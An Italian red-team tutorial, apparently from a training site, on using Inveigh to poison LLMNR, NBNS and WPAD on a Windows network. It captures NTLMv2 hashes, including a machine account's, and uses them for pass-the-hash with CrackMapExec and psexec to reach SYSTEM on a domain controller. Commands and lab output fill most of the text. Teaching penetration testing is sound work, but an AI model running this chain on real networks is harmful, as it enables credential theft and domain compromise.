---
title: >-
  Inveigh: Attacchi Hacker su Reti Windows per Rubare Hash NTLM via LLMNR, NBNS
  e WPAD
description: >-
  Inveigh è uno strumento PowerShell che consente di eseguire attacchi LLMNR,
  NBNS e WPAD direttamente su macchine Windows. Scopri come un attaccante può
  intercettare credenziali e rubare hash NTLM in modo silenzioso e mirato.
  Ideale per red team e test interni.
image: /INVEIGH.webp
draft: false
date: 2026-01-22T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - inveigh
  - ''
---

# Il Dominio della Rete Windows: Una Guida Offensiva con Inveigh

**Scenario di Red Team - Ambiente Controllato**

Ti trovi su un host Windows compromesso, un semplice punto d'appoggio con privilegi utente. La rete sembra silenziosa, ma sai che sotto la superficie i protocolli legacy parlano. È il momento di passare da guest a maestro della rete. L'obiettivo: intercettare, reindirizzare, elevarsi.

## Fase 1: Stabilire la Posizione di Ascolto con Inveigh

Su Windows, **Inveigh** è il coltellino svizzero per il poisoning. È nativo, potente e spesso non rilevato dagli AV se usato in memoria. Carichiamo il modulo e iniziamo ad ascoltare.

```powershell
# Caricamento del modulo Inveigh in memoria (bypassa restrizioni)
Import-Module .\Inveigh.ps1
# Oppure, per un controllo più fine con la versione .NET (Inveigh.exe)
.\Inveigh.exe
```

La vera forza di Inveigh sta nella granularità. Non siamo costretti a un attacco a scoppio, possiamo selezionare esattamente cosa avvelenare e cosa catturare.

```powershell
# Avvio di Inveigh con parametri specifici per un attacco chirurgico
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -WPAD Y -SMB N -HTTP Y -MachineAccounts Y -Proxy Y
```

**Analisi dei flag offensivi critici:**

* `-LLMNR Y / -NBNS Y`: Attiva l'avvelenamento delle risposte per Link-Local Multicast Name Resolution e NetBIOS Name Service. Sono i nostri ganci principali.
* `-WPAD Y`: Attiva l'ascolto e la risposta alle richieste di Web Proxy Auto-Discovery. Un vettore automatico e spesso privilegiato.
* `-MachineAccounts Y`: Includi nelle catture gli hash degli **account computer** (con suffisso `$`). Sono i bersagli più preziosi.
* `-Proxy Y`: Avvia un proxy HTTP falso per forzare l'autenticazione NTLM attraverso il traffico web.

**Output iniziale di successo:**

```
[*] Inveigh 2.0.7 [Started 2024.05.15.14:30:01]
[+] Primary IP Address  = 192.168.78.129
[+] Spoofer IP Address = 192.168.78.129
[+] LLMNR Spoofer      = Enabled
[+] NBNS Spoofer       = Enabled
[+] WPAD Spoofer       = Enabled
[+] HTTPS Proxy        = Enabled on port 8443
[+] Run Time           = 00:00:00
[+] Press any key to stop...
```

Siamo pronti. La rete ora ci vede come un host affidabile per la risoluzione nomi.

## Fase 2: L'Innesco e la Cattura degli Hash NTLMv2

L'attacco è passivo. Aspettiamo che un client, tentando di accedere a una risorsa di rete con un nome errato (es. `\\SRVFILE\`), invii una query LLMNR/NBNS. Noi rispondiamo.

**Cosa succede nella console di Inveigh:**

```
[+] [2024.05.15.14:32:17] LLMNR request for SRVFILE received from 192.168.78.30
[+] [2024.05.15.14:32:17] Sending LLMNR response for SRVFILE to 192.168.78.30
[+] [2024.05.15.14:32:18] HTTP NTLMv2 authentication request captured from 192.168.78.30 (CORP\giulia.rossi):
giulia.rossi::CORP:1122334455667788:3F5C...[truncated]...A2C1:010100000...[truncated]
```

Abbiamo il primo hash NTLMv2. Ma è un utente normale. L'obiettivo è ottenere privilegi.

## Fase 3: WPAD - La Miniera d'Oro Automatica

Il vero tesoro arriva con **WPAD**. I sistemi Windows, specialmente i server che eseguono servizi di sistema, tentano periodicamente di risolvere il nome `WPAD` per configurare un proxy. Con il flag `-WPAD Y` attivo, siamo noi a rispondere.

Il client ci contatterà via HTTP/HTTPS e, nella maggior parte delle configurazioni, tenterà un'autenticazione NTLM trasparente con i privilegi dell'account in esecuzione.

**Output del colpo grosso:**

```
[+] [2024.05.15.14:35:42] WPAD request received from 192.168.78.20
[+] [2024.05.15.14:35:42] Sending WPAD file to 192.168.78.20
[+] [2024.05.15.14:35:43] HTTPS NTLMv2 authentication captured from 192.168.78.20 (CORP\SRV_IIS$):
SRV_IIS$::CORP:AAEEFF0011223344:0B23...[truncated]...FFE1:010100000...[truncated]
```

**Bingo.** `SRV_IIS$` è un **account computer**. Ha spesso alti privilegi nell'Active Directory ed è un candidato perfetto per il **Pass-the-Hash** o l'**SMB Relay**.

## Fase 4: Pass-the-Hash (PtH) con Credenziali Catturate

Ora possiamo usare l'hash catturato per autenticarci su altri sistemi, impersonando l'account compromesso. Usiamo strumenti come **CrackMapExec** o il **Psexec** di Impacket direttamente dalla nostra macchina Windows.

```powershell
# Usando CrackMapExec per enumerare le condivisioni SMB su un target specifico con l'hash
.\crackmapexec.exe smb 192.168.78.50 -u 'SRV_IIS$' -H 'aad3b435b51404eeaad3b435b51404ee:0B23...[truncated NTLM hash]...' --local-auth -M shares
```

**Output:**

```
SMB         192.168.78.50   445    DC02             [*] Windows Server 2019 Standard 17763 x64 (name:DC02) (domain:CORP) (signing:True) (SMBv1:False)
SMB         192.168.78.50   445    DC02             [+] CORP\SRV_IIS$ aad3b435b51404eeaad3b435b51404ee:0B23...[truncated]... (Pwn3d!)
SMB         192.168.78.50   445    DC02             [+] Enumerated shares
SMB         192.168.78.50   445    DC02             Share           Permissions     Remark
SMB         192.168.78.50   445    DC02             -----           -----------     ------
SMB         192.168.78.50   445    DC02             ADMIN$                          Remote Admin
SMB         192.168.78.50   445    DC02             C$                              Default share
```

L'indicatore `(Pwn3d!)` ci dice che l'account ha privilegi di amministratore locale su `DC02`. È ora di ottenere esecuzione di comandi.

```powershell
# Ottenere una shell inversa o eseguire comandi usando Psexec di Impacket
.\psexec.exe -hashes :0B23...[truncated]... CORP/SRV_IIS$@192.168.78.50 -accepteula cmd.exe
```

Questa sessione ci darà un prompt dei comandi con i privilegi di SYSTEM sull'host target (`DC02`), aprendo la strada a un completo dominio della foresta Active Directory.

## Conclusione dell'Operazione

**Inveigh** dimostra che la superficie d'attacco più pericolosa spesso non è una vulnerabilità zero-day, ma l'abuso di funzionalità di rete considerate "normali". LLMNR, NBNS e WPAD, lasciati attivi per inerzia o compatibilità, trasformano ogni query di rete fallita in un potenziale evento di compromissione.

Il flusso **Poisoning -> Cattura Hash di Account Computer -> Pass-the-Hash** è una catena letale che, da una semplice posizione di ascolto, porta al controllo di asset critici. In un ambiente di testing autorizzato, padroneggiare questi strumenti significa comprendere nel profondo le dinamiche reali di un attacco moderno.

***

### Pronto a Trasformare la Conoscenza in Competenza Reale?

Questa è solo una dimostrazione in un ambiente controllato. Per imparare a progettare, eseguire e documentare operazioni di Red Teaming complete, serve una guida esperta e un percorso strutturato.

**HackitaU** offre proprio questo:

* **Mentorship 1:1** per affinare le tue tattiche di sicurezza offensiva.
* **Corsi Aziendali** su misura per addestrare i tuoi team alle minacce più avanzate.
* Un approccio **pratico, etico e focalizzato sulla consapevolezza** reale.

Se credi nel valore di una formazione di alto livello, puoi supportare il progetto anche con una [donazione](https://hackita.it/supporto/). Ogni contributo ci aiuta a mantenere e migliorare la qualità della formazione.

**Addestra la Tua Mente. Proteggi il Futuro. Solo in Ambienti Autorizzati.**

\[Hackita – La Tua Avanzata nella Sicurezza Offensiva]
